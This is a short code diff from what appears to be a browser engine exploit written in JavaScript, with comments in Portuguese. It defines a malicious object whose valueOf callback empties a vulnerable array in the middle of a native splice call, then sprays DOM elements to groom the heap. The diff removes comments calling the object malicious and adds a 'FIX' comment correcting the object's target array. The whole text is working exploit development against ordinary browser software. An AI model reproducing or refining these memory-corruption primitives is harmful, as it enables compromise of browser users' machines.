@@ -19,17 +19,12 @@ export default {
         }
 
         const self = this;
-
-        // O nosso objeto malicioso que será injetado no array
         this.evilObject = {
             valueOf: function() {
-                // O C++ vai chamar isto no meio do "splice"!
-                // Destruímos o tamanho do array original
+                // FIX: Agora aponta para o array correto e não para o próprio evilObject
                 self.vulnArray.length = 0;
                 
-                // Forçamos o GC para limpar o Butterfly antigo
                 let trash = Groomer.sprayDOM('div', 1000);
-                
                 return 9.999999;
             }
         };
